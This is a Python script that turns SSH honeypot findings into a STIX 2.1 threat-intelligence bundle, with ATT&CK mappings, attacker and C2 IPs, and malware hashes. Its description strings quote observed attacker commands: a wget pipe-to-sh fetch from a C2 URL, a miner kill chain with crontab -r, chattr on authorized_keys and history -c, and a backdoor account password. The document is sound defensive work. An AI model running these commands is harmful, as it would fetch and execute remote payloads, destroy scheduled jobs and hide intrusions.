#!/usr/bin/env python3
"""
gen_stix_bundle.py -- Build a STIX 2.1 bundle from families.json.

Usage:
    python3 analysis/gen_stix_bundle.py [families.json] [output.json]
Defaults: families.json -> honeypot_stix_bundle.json
"""

import json
import sys
import uuid
from datetime import datetime, timezone

import stix2

# --- ATT&CK technique mapping per family (verified against MITRE ATT&CK) ---
# T1543.002 = Systemd Service (Linux); T1543.001 is macOS Launch Agent -- NOT that one.
ATTACK_MAP = {
    "F1":  ("T1110.001", "Brute Force: Password Guessing"),
    "F2":  ("T1496",     "Resource Hijacking"),
    "F3":  ("T1105",     "Ingress Tool Transfer"),
    "F4":  ("T1543.002", "Create or Modify System Process: Systemd Service"),
    "F5":  ("T1059.004", "Command and Scripting Interpreter: Unix Shell"),
    "F6":  ("T1543.002", "Create or Modify System Process: Systemd Service"),
    "F7":  ("T1082",     "System Information Discovery"),
    "F8":  ("T1082",     "System Information Discovery"),
    "F9":  ("T1110.001", "Brute Force: Password Guessing"),
    "F10": ("T1027",     "Obfuscated Files or Information"),
    "F11": ("T1136.001", "Create Account: Local Account"),
    "F12": ("T1105",     "Ingress Tool Transfer"),
    "F13": ("T1021.004", "Remote Services: SSH"),
    "F14": ("T1082",     "System Information Discovery"),
    "F15": ("T1082",     "System Information Discovery"),
}

FAMILY_NAMES = {
    "F1":  "Credential Stuffing - Auth Only",
    "F2":  "Diicot GPU Miner",
    "F3":  "SCP Dropper",
    "F4":  "w.sh/astats Persistence - Early Wave",
    "F5":  "C2 Dropper - Fileless wget|sh",
    "F6":  "w.sh/astats Persistence - Large Wave",
    "F7":  "VPS Infrastructure Scout",
    "F8":  "SSHCHK C2 Liveness Check",
    "F9":  "Auth-Only Scanner Cluster",
    "F10": "ELF Echo Injector",
    "F11": "Meow Dropper",
    "F12": "wowo Dropper",
    "F13": "gJw27HGL SSH Worm",
    "F14": "Architecture Capability Prober",
    "F15": "SSH Liveness Probe",
}

# Pi worm -- sha256 verified across 6 quarantine captures (same hash every time)
WORM_SHA256 = "6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b"

# F10 ELF binaries -- sha256 verified: two independent session extractions gave identical hashes
F10_BINARIES = [
    {
        "name": "amd64",
        "sha256": "0ff23a77abba239a50412c720b2e423fcb3fb00e2362189cafa116eeb9bdce27",
        "desc": "5MB 64-bit Go binary, stripped. First stage of F10 ELF echo injector.",
    },
    {
        "name": "kal64",
        "sha256": "b02337d82c44ed46e5b186bd54cde717be39da81a29fb332090d10a5c444ccb6",
        "desc": "3MB 64-bit Go binary, stripped. Second stage of F10 ELF echo injector.",
    },
    {
        "name": "kswpad",
        "sha256": "6fddaa099096c0caee183e4bb95e9fe79003e6ae6dc41d6b1aa3b4aec221bd38",
        "desc": "1.2MB ELF 32-bit x86. Third stage of F10 ELF echo injector.",
    },
    {
        "name": "linux",
        "sha256": "25c34c028f0c119da251ca5d17020df79a030c7c3b86c5a8df699065016a21a2",
        "desc": "1.3MB ELF 32-bit x86, UPX packed. Fourth and final stage of F10 ELF echo injector.",
    },
]

# F10 C2 servers -- confirmed in session.log URL log (wget/curl tried before hex echo fallback)
F10_C2_IPS = [
    {
        "ip": "195.177.94.72",
        "port": 564,
        "paths": "/b/amd64, /b/kal64, /b/kswpad, /b/linux, /s/amd64, /s/kal64",
    },
    {
        "ip": "45.88.91.135",
        "port": 35146,
        "paths": "/b/amd64, /b/kal64, /b/kswpad, /b/linux",
    },
]

# F5 C2 -- fileless exec target confirmed in NOTES (https, not http)
F5_C2_IP  = "14.46.136.77"
F5_C2_URL = "https://14.46.136.77/sh"

# F11 meow dropper C2 servers -- confirmed in FINDINGS.md (serve /meow + /meowarm64)
F11_C2_IPS = ["34.11.111.237", "35.237.91.38", "34.181.210.37"]

# F14 capability test probes -- sha256 + size from quarantine capture + FINDINGS.md
F14_PROBES = [
    {
        "name": "tz7n3j1l8apie4kgjj19caibdc",
        "sha256": "e374a7ad447d2cf791ecae122894a51ba723901ea132e7fa16cd47c44e4a1769",
        "size": 512,
        "arch": "ELF64 x86-64",
        "desc": (
            "Handcrafted 'Hello, world!' ELF64 assembly stub (syscall instruction, no libc, 2 syscalls). "
            "Uploaded via SCP to /bin/ to confirm x86-64 execution before real payload."
        ),
    },
    {
        "name": "tz7n3j1l8apie4kgjj19caibdc",
        "sha256": "f74a8b06db4f8f48f4a19ea5c01bade2a0dfb9290c4ed04a3f1a3eaa298a843d",
        "size": 348,
        "arch": "ELF32 x86",
        "desc": (
            "Handcrafted 'Hello, world!' ELF32 assembly stub (int 0x80, no libc, 2 syscalls). "
            "Uploaded via SCP to /bin/ to confirm x86 32-bit execution before real payload."
        ),
    },
]

# F2 per-IP stage breakdown -- verified by replay.py spot-check (2026-06-28 session)
F2_STAGE_BY_IP = {
    "35.200.201.144": {"recon_only": 9,  "recon_kill_execute": 28},
    "103.146.202.84": {"recon_only": 11, "recon_kill_execute": 0},
}

# Project-specific UUIDv5 namespace for deterministic SDO/SRO IDs.
# SCOs (IPv4Address, File, URL) get deterministic IDs from the stix2 library automatically.
_NS = uuid.UUID("00abedb4-aa42-466c-9c01-fed23315a9b7")

# Campaign start -- first log entry in FINDINGS.md
CAMPAIGN_START = datetime(2026, 5, 26, 11, 37, tzinfo=timezone.utc)


def _det_id(stix_type, *parts):
    """UUIDv4 ID for SDOs/SROs, seeded deterministically via uuid5 then re-encoded.
    STIX 2.1 s2.9 requires UUIDv4 for SDOs/SROs (only SCOs may use UUIDv5).
    We derive a stable v4 UUID by taking our v5 bytes and forcing the version nibble."""
    slug = stix_type + ":" + ":".join(str(p) for p in parts)
    v5 = uuid.uuid5(_NS, slug)
    # overwrite version nibble (bits 76-79 of byte 6) to 4, keep everything else
    b = bytearray(v5.bytes)
    b[6] = (b[6] & 0x0F) | 0x40
    b[8] = (b[8] & 0x3F) | 0x80
    return f"{stix_type}--{uuid.UUID(bytes=bytes(b))}"


def _att_ref(technique_id):
    url_path = technique_id.replace(".", "/")
    return stix2.ExternalReference(
        source_name="mitre-attack",
        external_id=technique_id,
        url=f"https://attack.mitre.org/techniques/{url_path}/",
    )


def build_bundle(families_path):
    with open(families_path) as f:
        data = json.load(f)

    families = data["families"]
    objects = []
    counts = {
        "attack_pattern": 0,
        "ipv4_addr": 0,
        "url": 0,
        "file": 0,
        "indicator": 0,
        "malware": 0,
        "note": 0,
        "relationship": 0,
    }

    # -------------------------------------------------------------------------
    # 1. attack-pattern SDOs -- one per family
    # -------------------------------------------------------------------------
    ap_by_fid = {}
    for fid, fdata in families.items():
        tech_id, tech_name = ATTACK_MAP[fid]
        ap = stix2.AttackPattern(
            id=_det_id("attack-pattern", fid),
            name=f"{FAMILY_NAMES[fid]} [{fid}]",
            description=(
                f"Honeypot family {fid}. "
                f"{fdata['ip_count']} source IPs, {fdata['session_count']} sessions. "
                f"Primary technique: {tech_id} ({tech_name})."
            ),
            external_references=[_att_ref(tech_id)],
        )
        ap_by_fid[fid] = ap
        objects.append(ap)
        counts["attack_pattern"] += 1

    # -------------------------------------------------------------------------
    # 2. ipv4-addr SCOs (attacker source IPs from families.json)
    #    Deterministic IDs handled automatically by the stix2 library.
    # -------------------------------------------------------------------------
    ip_to_fids = {}
    for fid, fdata in families.items():
        for entry in fdata.get("ips", []):
            ip = entry["ip"]
            ip_to_fids.setdefault(ip, []).append(fid)

    addr_by_ip = {}
    for ip in ip_to_fids:
        addr = stix2.IPv4Address(value=ip)
        addr_by_ip[ip] = addr
        objects.append(addr)
        counts["ipv4_addr"] += 1

    # -------------------------------------------------------------------------
    # 3. indicator SDOs -- one per unique attacker source IP
    # -------------------------------------------------------------------------
    ind_by_ip = {}
    for ip in ip_to_fids:
        ind = stix2.Indicator(
            id=_det_id("indicator", ip),
            name=f"Honeypot attacker IP: {ip}",
            description=(
                f"Source IP observed in honeypot campaign (Helsinki VPS, port 22). "
                f"Families: {', '.join(sorted(ip_to_fids[ip]))}."
            ),
            pattern=f"[ipv4-addr:value = '{ip}']",
            pattern_type="stix",
            valid_from=CAMPAIGN_START,
            indicator_types=["malicious-activity"],
        )
        ind_by_ip[ip] = ind
        objects.append(ind)
        counts["indicator"] += 1

    # -------------------------------------------------------------------------
    # 4. indicator -> "indicates" -> attack-pattern relationships
    #    Multi-family IPs get one relationship per family.
    #    F2 relationships carry per-IP stage breakdown in description.
    # -------------------------------------------------------------------------
    for ip, fids in ip_to_fids.items():
        ind = ind_by_ip[ip]
        for fid in fids:
            if fid == "F2" and ip in F2_STAGE_BY_IP:
                sb = F2_STAGE_BY_IP[ip]
                desc = (
                    f"IP {ip} attributed to F2 (Diicot GPU Miner). "
                    f"Per-IP stage: recon_only={sb['recon_only']}, "
                    f"recon_kill_execute={sb['recon_kill_execute']}. "
                    f"recon_kill_execute = full chain: "
                    f"crontab -r + chattr -iae authorized_keys + deploy miner (disown)."
                )
            else:
                desc = f"IP {ip} attributed to {fid} ({FAMILY_NAMES[fid]})."
            objects.append(stix2.Relationship(
                id=_det_id("relationship", "ind-to-ap", ip, fid),
                relationship_type="indicates",
                source_ref=ind.id,
                target_ref=ap_by_fid[fid].id,
                description=desc,
                start_time=CAMPAIGN_START,
            ))
            counts["relationship"] += 1

    # -------------------------------------------------------------------------
    # 5. F2 stage breakdown -- Note SDO (per-IP breakdown verified by replay)
    # -------------------------------------------------------------------------
    f2_sb = families["F2"].get("stage_breakdown", {})
    objects.append(stix2.Note(
        abstract="F2 Diicot GPU Miner -- per-IP kill chain stage breakdown",
        content=(
            "Stage breakdown verified by replay.py spot-check (2026-06-28).\n"
            "\n"
            "35.200.201.144: recon_only=9, recon_kill_execute=28\n"
            "  9 sessions stopped at nvidia-smi Product Name check (GPU check threshold).\n"
            "  28 sessions ran full kill chain:\n"
            "    crontab -r ; chattr -iae ~/.ssh/authorized_keys ; pkill competing miners ;\n"
            "    chmod 777 <random8chars> ; ./<random8chars> &>/dev/null & disown ; history -c\n"
            "  Binary name randomized per session (kvjeboYe, LvIaTelV, HbmeBFwx, ...).\n"
            "\n"
            "103.146.202.84: recon_only=11, recon_kill_execute=0\n"
            "  11 sessions stopped at recon, never reached deploy stage.\n"
            "\n"
            f"Family totals: recon_only={f2_sb.get('recon_only', 0)}, "
            f"recon_kill={f2_sb.get('recon_kill', 0)}, "
            f"recon_kill_execute={f2_sb.get('recon_kill_execute', 0)}\n"
            "\n"
            "Additional techniques in recon_kill_execute path:\n"
            "  T1562.001  chattr -iae on authorized_keys (immutable even to root)\n"
            "  T1070.003  crontab -r (wipes all scheduled jobs including other malware)\n"
            "  T1496      Monero miner deployed and disowned"
        ),
        object_refs=[ap_by_fid["F2"].id] + [
            ind_by_ip[e["ip"]].id
            for e in families["F2"]["ips"]
            if e["ip"] in ind_by_ip
        ],
    ))
    counts["note"] += 1

    # -------------------------------------------------------------------------
    # 6. Pi worm (F13) -- malware SDO + file SCO + relationships
    # -------------------------------------------------------------------------
    worm_file = stix2.File(
        name="gJw27HGL",
        hashes={"SHA-256": WORM_SHA256},
        size=4745,  # exact -- from SCP C-header "tuLtUp8R 4745 bytes" in T2 replay
        mime_type="text/plain",
    )
    objects.append(worm_file)
    counts["file"] += 1

    worm_malware = stix2.Malware(
        id=_det_id("malware", "gJw27HGL", WORM_SHA256),
        name="gJw27HGL SSH Worm",
        is_family=False,
        malware_types=["worm", "backdoor"],
        description=(
            "Bash SSH worm, 4745 bytes (sha256: 6d1fe6ab...). "
            "Spreads via sshpass with Raspberry Pi default passwords "
            "('raspberry', 'raspberry993311'). "
            "Kill chain: (1) kills competitors (minerd, ktx-*, kaiten, zmap, bins.sh, perl); "
            "(2) blocks competitor C2 via /etc/hosts (bins.deutschland-zahlung.eu -> 127.0.0.1); "
            "(3) injects RSA pubkey into /root/.ssh/authorized_keys (permanent backdoor); "
            "(4) changes pi user password to hardcoded SHA-512 hash; "
            "(5) spawns IRC bot on Undernet (ix1/ix2.undernet.org), joins #biret -- "
            "commands arrive as base64 PRIVMSG with RSA signature, "
            "botnet cannot be hijacked by joining the channel (operator must hold the private key); "
            "(6) self-propagates: zmap scans 100k IPs on port 22, SCPs itself to victims. "
            "6 quarantine captures Jun 2, 6, 8, 14, 17, 24 -- same hash every time. "
            "NOT a Go worm -- pure bash."
        ),
        sample_refs=[worm_file.id],
    )
    objects.append(worm_malware)
    counts["malware"] += 1

    objects.append(stix2.Relationship(
        id=_det_id("relationship", "malware-uses-ap", "gJw27HGL", "F13"),
        relationship_type="uses",
        source_ref=worm_malware.id,
        target_ref=ap_by_fid["F13"].id,
    ))
    counts["relationship"] += 1

    for entry in families["F13"]["ips"]:
        ip = entry["ip"]
        if ip in ind_by_ip:
            objects.append(stix2.Relationship(
                id=_det_id("relationship", "ind-to-malware", ip),
                relationship_type="indicates",
                source_ref=ind_by_ip[ip].id,
                target_ref=worm_malware.id,
                description=f"IP {ip} uploaded gJw27HGL worm payload via SCP (F13).",
            ))
            counts["relationship"] += 1

    # -------------------------------------------------------------------------
    # 7. F10 ELF binaries -- 4 malware SDOs + file SCOs
    # -------------------------------------------------------------------------
    for b in F10_BINARIES:
        bfile = stix2.File(
            name=b["name"],
            hashes={"SHA-256": b["sha256"]},
        )
        objects.append(bfile)
        counts["file"] += 1

        bmal = stix2.Malware(
            id=_det_id("malware", "F10", b["name"]),
            name=f"F10 payload: {b['name']}",
            is_family=False,
            malware_types=["dropper"],
            description=(
                f"{b['desc']} "
                f"Delivered via hex echo injection (43k+ echo -e -n commands per binary) "
                f"when C2 downloads failed (195.177.94.72:564 and 45.88.91.135:35146 unreachable). "
                f"SHA-256 verified across two independent session extractions."
            ),
            sample_refs=[bfile.id],
        )
        objects.append(bmal)
        counts["malware"] += 1

        objects.append(stix2.Relationship(
            id=_det_id("relationship", "f10-mal-uses-ap", b["name"]),
            relationship_type="uses",
            source_ref=bmal.id,
            target_ref=ap_by_fid["F10"].id,
        ))
        counts["relationship"] += 1

    # -------------------------------------------------------------------------
    # 8. F10 C2 server indicators
    # -------------------------------------------------------------------------
    for c2 in F10_C2_IPS:
        ip = c2["ip"]
        objects.append(stix2.IPv4Address(value=ip))
        counts["ipv4_addr"] += 1

        ind = stix2.Indicator(
            id=_det_id("indicator", "c2", ip, "F10"),
            name=f"F10 C2 server: {ip}:{c2['port']}",
            description=(
                f"F10 ELF echo injector C2 server. "
                f"Binaries served on port {c2['port']} at: {c2['paths']}. "
                f"Both C2s unreachable throughout campaign -- every session fell back to "
                f"hex echo injection. Confirmed via wget/curl URL log in session.log."
            ),
            pattern=f"[ipv4-addr:value = '{ip}']",
            pattern_type="stix",
            valid_from=CAMPAIGN_START,
            indicator_types=["malicious-activity"],
        )
        objects.append(ind)
        counts["indicator"] += 1

        objects.append(stix2.Relationship(
            id=_det_id("relationship", "c2-ind-to-ap", ip, "F10"),
            relationship_type="indicates",
            source_ref=ind.id,
            target_ref=ap_by_fid["F10"].id,
        ))
        counts["relationship"] += 1

    # -------------------------------------------------------------------------
    # 9. F5 C2 -- IP indicator + URL SCO + URL indicator
    # -------------------------------------------------------------------------
    objects.append(stix2.IPv4Address(value=F5_C2_IP))
    counts["ipv4_addr"] += 1

    f5_url_sco = stix2.URL(value=F5_C2_URL)
    objects.append(f5_url_sco)
    counts["url"] += 1

    f5_ip_ind = stix2.Indicator(
        id=_det_id("indicator", "c2", F5_C2_IP, "F5"),
        name=f"F5 C2 server: {F5_C2_IP}",
        description=(
            "C2 server for F5 fileless dropper. "
            "wget|sh target: wget --no-check-certificate -qO- https://14.46.136.77/sh | sh -s ssh. "
            "auth_ok hex beacon sent before fetch. "
            "Entry vector ('ssh') passed as argument to the downloaded script."
        ),
        pattern=f"[ipv4-addr:value = '{F5_C2_IP}']",
        pattern_type="stix",
        valid_from=CAMPAIGN_START,
        indicator_types=["malicious-activity"],
    )
    objects.append(f5_ip_ind)
    counts["indicator"] += 1

    f5_url_ind = stix2.Indicator(
        id=_det_id("indicator", "c2-url", F5_C2_URL, "F5"),
        name=f"F5 C2 dropper URL: {F5_C2_URL}",
        description=(
            "Exact C2 URL for F5 fileless exec. "
            "Script piped directly into sh -- nothing written to disk."
        ),
        pattern=f"[url:value = '{F5_C2_URL}']",
        pattern_type="stix",
        valid_from=CAMPAIGN_START,
        indicator_types=["malicious-activity"],
    )
    objects.append(f5_url_ind)
    counts["indicator"] += 1

    objects.append(stix2.Relationship(
        id=_det_id("relationship", "c2-ip-to-ap", F5_C2_IP, "F5"),
        relationship_type="indicates",
        source_ref=f5_ip_ind.id,
        target_ref=ap_by_fid["F5"].id,
    ))
    objects.append(stix2.Relationship(
        id=_det_id("relationship", "c2-url-to-ap", F5_C2_URL, "F5"),
        relationship_type="indicates",
        source_ref=f5_url_ind.id,
        target_ref=ap_by_fid["F5"].id,
    ))
    counts["relationship"] += 2

    # -------------------------------------------------------------------------
    # 10. F11 meow dropper C2 server indicators
    # -------------------------------------------------------------------------
    for ip in F11_C2_IPS:
        objects.append(stix2.IPv4Address(value=ip))
        counts["ipv4_addr"] += 1

        ind = stix2.Indicator(
            id=_det_id("indicator", "c2", ip, "F11"),
            name=f"F11 C2 server: {ip}",
            description=(
                f"Meow dropper C2 (F11). Serves /meow (x86-64) and /meowarm64 (ARM64). "
                f"Creates backdoor sudo users admin1+user1 (password: modzmodz). "
                f"Writes credential string to /tmp/mew."
            ),
            pattern=f"[ipv4-addr:value = '{ip}']",
            pattern_type="stix",
            valid_from=CAMPAIGN_START,
            indicator_types=["malicious-activity"],
        )
        objects.append(ind)
        counts["indicator"] += 1

        objects.append(stix2.Relationship(
            id=_det_id("relationship", "c2-ind-to-ap", ip, "F11"),
            relationship_type="indicates",
            source_ref=ind.id,
            target_ref=ap_by_fid["F11"].id,
        ))
        counts["relationship"] += 1

    # -------------------------------------------------------------------------
    # 11. F14 capability test probes -- file SCOs + Note SDO
    # -------------------------------------------------------------------------
    f14_file_ids = []
    for probe in F14_PROBES:
        pfile = stix2.File(
            name=probe["name"],
            hashes={"SHA-256": probe["sha256"]},
            size=probe["size"],
        )
        objects.append(pfile)
        counts["file"] += 1
        f14_file_ids.append(pfile.id)

    objects.append(stix2.Note(
        abstract="F14 Architecture Capability Prober -- test ELF payloads",
        content=(
            "Two minimal ELF test binaries quarantine-captured from F14 session\n"
            "(185.129.62.63, 2026-06-12 12:54 Rabat, client SSH-2.0-OpenSSH_9.9).\n"
            "\n"
            "e374a7ad...  512B  ELF64 x86-64  'Hello, world!' via syscall instruction\n"
            "f74a8b06...  348B  ELF32 x86     'Hello, world!' via int 0x80\n"
            "\n"
            "Both are handcrafted assembly: write(1, 'Hello, world!\\n', 14) then exit(0).\n"
            "No libc, no imports, 2 syscalls each. Uploaded to /bin/, executed, deleted.\n"
            "Same random filename reused for both (first deleted before second upload).\n"
            "top -bn1 was run first -- checking for competing malware or timing the load.\n"
            "Real payload was never sent -- honeypot response likely failed the check.\n"
            "45 minutes earlier, a VPS scout (F7) ran from 85.215.175.242 (SSH-2.0-Go).\n"
            "Possible two-stage pipeline, but both IPs are dark since Jun 12."
        ),
        object_refs=[ap_by_fid["F14"].id] + f14_file_ids,
    ))
    counts["note"] += 1

    # -------------------------------------------------------------------------
    # 12. Credential feedback loop -- Note SDO
    # -------------------------------------------------------------------------
    objects.append(stix2.Note(
        abstract="Credential feedback loop -- chpasswd passwords recycled into wordlists",
        content=(
            "12 passwords confirmed in both:\n"
            "  (a) chpasswd targets logged in F4/F6/F11 sessions\n"
            "  (b) subsequent login attempts from unrelated IPs, days to weeks later\n"
            "\n"
            "Strongest example: N41+mk##3RKWkK-  -- 11 login hits from unrelated IPs.\n"
            "A machine-generated strong password has no business in any wordlist unless\n"
            "it was harvested from a victim machine that ran chpasswd.\n"
            "\n"
            "8 more candidate passwords in chpasswd stream have not yet looped back.\n"
            "\n"
            "Mechanism: attacker A runs chpasswd on victim X. Credential is exfiltrated\n"
            "(by a separate harvesting step not directly observed). Attacker B adds it\n"
            "to their spray wordlist. Honeypot logs the attempt weeks later.\n"
            "The honeypot was never actually compromised -- chpasswd is a noop in\n"
            "the fake shell -- but the command and target password were logged."
        ),
        object_refs=[
            ap_by_fid["F4"].id,
            ap_by_fid["F6"].id,
            ap_by_fid["F11"].id,
            ap_by_fid["F1"].id,
            ap_by_fid["F9"].id,
        ],
    ))
    counts["note"] += 1

    # -------------------------------------------------------------------------
    # 13. Wrap in bundle (stix2 validates all objects at construction time)
    # -------------------------------------------------------------------------
    bundle = stix2.Bundle(objects=objects)
    return bundle, counts


def main():
    families_path = sys.argv[1] if len(sys.argv) > 1 else "families.json"
    output_path = sys.argv[2] if len(sys.argv) > 2 else "honeypot_stix_bundle.json"

    print(f"Reading {families_path} ...")
    bundle, counts = build_bundle(families_path)

    print(f"Writing {output_path} ...")
    with open(output_path, "w") as f:
        f.write(bundle.serialize(pretty=True))

    total = sum(counts.values())
    print()
    print("Object counts:")
    for k, v in counts.items():
        print(f"  {k:20s} {v:4d}")
    print(f"  {'TOTAL':20s} {total:4d}")
    print(f"  bundle.id = {bundle.id}")
    print("Done.")


if __name__ == "__main__":
    main()
